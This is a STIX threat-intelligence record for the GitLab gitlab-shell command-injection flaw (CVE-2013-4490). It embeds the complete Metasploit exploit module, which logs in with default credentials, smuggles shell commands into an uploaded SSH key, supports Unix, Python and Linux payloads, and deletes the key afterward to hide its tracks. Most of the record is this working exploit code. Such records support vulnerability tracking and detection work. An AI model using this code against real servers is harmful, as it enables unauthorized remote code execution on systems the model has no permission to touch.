{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--127192ae-d611-483c-adeb-7e96da941660",
    "created": "2024-08-14T17:08:10.820351Z",
    "modified": "2024-08-14T17:08:10.820355Z",
    "name": "Gitlab-shell Code Execution",
    "description": "( This module takes advantage of the addition of authorized ssh keys in the gitlab-shell functionality of Gitlab. Versions of gitlab-shell prior to 1.7.4 used the ssh key provided directly in a system call resulting in a command injection vulnerability. As this relies on adding an ssh key to an account, valid credentials are required to exploit this vulnerability. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/gitlab_shell_exec.rb",
            "external_id": "gitlab_shell_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://about.gitlab.com/2013/11/04/gitlab-ce-6-2-and-5-4-security-release/"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4490"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Gitlab-shell Code Execution',\n      'Description'    => %q(\n        This module takes advantage of the addition of authorized\n        ssh keys in the gitlab-shell functionality of Gitlab. Versions\n        of gitlab-shell prior to 1.7.4 used the ssh key provided directly\n        in a system call resulting in a command injection vulnerability. As\n        this relies on adding an ssh key to an account, valid credentials\n        are required to exploit this vulnerability.\n      ),\n      'Author'  =>\n        [\n          'Brandon Knight'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'https://about.gitlab.com/2013/11/04/gitlab-ce-6-2-and-5-4-security-release/'],\n          ['CVE', '2013-4490']\n        ],\n      'Platform'  => 'linux',\n      'Targets'        =>\n        [\n          [ 'Linux',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86\n            }\n          ],\n          [ 'Linux (x64)',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X64\n            }\n          ],\n          [ 'Unix (CMD)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Payload' =>\n                {\n                  'Compat'      =>\n                    {\n                      'RequiredCmd' => 'openssl perl python'\n                    },\n                  'BadChars' => \"\\x22\"\n                }\n            }\n          ],\n          [ 'Python',\n            {\n              'Platform' => 'python',\n              'Arch' => ARCH_PYTHON,\n              'Payload' =>\n                {\n                  'BadChars' => \"\\x22\"\n                }\n            }\n          ]\n        ],\n      'CmdStagerFlavor' => %w( bourne printf ),\n      'DisclosureDate' => '2013-11-04',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('USERNAME',  [true, 'The username to authenticate as', 'root']),\n        OptString.new('PASSWORD',  [true, 'The password for the specified username', '5iveL!fe']),\n        OptString.new('TARGETURI', [true,  'The path to Gitlab', '/'])\n      ])\n  end\n\n  def exploit\n    login\n    case target['Platform']\n    when 'unix'\n      execute_command(payload.encoded)\n    when 'python'\n      execute_command(\"python -c \\\\\\\"#{payload.encoded}\\\\\\\"\")\n    when 'linux'\n      execute_cmdstager(temp: './', linemax: 2800)\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    key_id = add_key(cmd)\n    delete_key(key_id)\n  end\n\n  def check\n    res = send_request_cgi('uri' => normalize_uri(target_uri.path.to_s, 'users', 'sign_in'))\n    if res && res.body && res.body.include?('GitLab')\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  def login\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n    signin_page = normalize_uri(target_uri.path.to_s, 'users', 'sign_in')\n\n    # Get a valid session cookie and authenticity_token for the next step\n    res = send_request_cgi(\n                            'method' => 'GET',\n                            'cookie' => 'request_method=GET',\n                            'uri'    => signin_page\n    )\n\n    fail_with(Failure::TimeoutExpired, \"#{peer} - Connection timed out during login\") unless res\n\n    local_session_cookie = res.get_cookies.scan(/(_gitlab_session=[A-Za-z0-9%-]+)/).flatten[0]\n    auth_token = res.body.scan(/<input name=\"authenticity_token\" type=\"hidden\" value=\"(.*?)\"/).flatten[0]\n\n    if res.body.include? 'user[email]'\n      @gitlab_version = 5\n      user_field = 'user[email]'\n    else\n      @gitlab_version = 7\n      user_field = 'user[login]'\n    end\n\n    # Perform the actual login and get the newly assigned session cookie\n    res = send_request_cgi(\n                            'method' => 'POST',\n                            'cookie' => local_session_cookie,\n                            'uri'    => signin_page,\n                            'vars_post' =>\n                              {\n                                'utf8' => \"\\xE2\\x9C\\x93\",\n                                'authenticity_token' => auth_token,\n                                \"#{user_field}\" => username,\n                                'user[password]' => password,\n                                'user[remember_me]' => 0\n                              }\n                          )\n\n    fail_with(Failure::NoAccess, \"#{peer} - Login failed\") unless res && res.code == 302\n\n    @session_cookie = res.get_cookies.scan(/(_gitlab_session=[A-Za-z0-9%-]+)/).flatten[0]\n\n    fail_with(Failure::NoAccess, \"#{peer} - Unable to get session cookie\") if @session_cookie.nil?\n  end\n\n  def add_key(cmd)\n    if @gitlab_version == 5\n      @key_base = normalize_uri(target_uri.path.to_s, 'keys')\n    else\n      @key_base = normalize_uri(target_uri.path.to_s, 'profile', 'keys')\n    end\n\n    # Perform an initial request to get an authenticity_token so the actual\n    # key addition can be done successfully.\n    res = send_request_cgi(\n                            'method' => 'GET',\n                            'cookie' => \"request_method=GET; #{@session_cookie}\",\n                            'uri'    => normalize_uri(@key_base, 'new')\n    )\n\n    fail_with(Failure::TimeoutExpired, \"#{peer} - Connection timed out during request\") unless res\n\n    auth_token = res.body.scan(/<input name=\"authenticity_token\" type=\"hidden\" value=\"(.*?)\"/).flatten[0]\n    title = rand_text_alphanumeric(16)\n    key_info = rand_text_alphanumeric(6)\n\n    # Generate a random ssh key\n    key = OpenSSL::PKey::RSA.new 2048\n    type = key.ssh_type\n    data = [key.to_blob].pack('m0')\n\n    openssh_format = \"#{type} #{data}\"\n\n    # Place the payload in to the key information to perform the command injection\n    key = \"#{openssh_format} #{key_info}';#{cmd}; echo '\"\n\n    res = send_request_cgi(\n                            'method' => 'POST',\n                            'cookie' => \"request_method=GET; #{@session_cookie}\",\n                            'uri'    => @key_base,\n                            'vars_post' =>\n                              {\n                                'utf8' => \"\\xE2\\x9C\\x93\",\n                                'authenticity_token' => auth_token,\n                                'key[title]' => title,\n                                'key[key]' => key\n                              }\n                          )\n\n    fail_with(Failure::TimeoutExpired, \"#{peer} - Connection timed out during request\") unless res\n\n    # Get the newly added key id so it can be used for cleanup\n    key_id = res.headers['Location'].split('/')[-1]\n\n    key_id\n  end\n\n  def delete_key(key_id)\n    res = send_request_cgi(\n                             'method' => 'GET',\n                             'cookie' => \"request_method=GET; #{@session_cookie}\",\n                             'uri'    => @key_base\n                           )\n\n    fail_with(Failure::TimeoutExpired, \"#{peer} - Connection timed out during request\") unless res\n\n    auth_token = res.body.scan(/<meta content=\"(.*?)\" name=\"csrf-token\"/).flatten[0]\n\n    # Remove the key which was added to clean up after ourselves\n    res = send_request_cgi(\n                             'method' => 'POST',\n                             'cookie' => \"#{@session_cookie}\",\n                             'uri'    => normalize_uri(\"#{@key_base}\", \"#{key_id}\"),\n                             'vars_post' =>\n                             {\n                               '_method' => 'delete',\n                               'authenticity_token' => auth_token\n                             }\n                           )\n\n    fail_with(Failure::TimeoutExpired, \"#{peer} - Connection timed out during request\") unless res\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-11-04",
    "x_mitre_platforms": [
        "python'"
    ]
}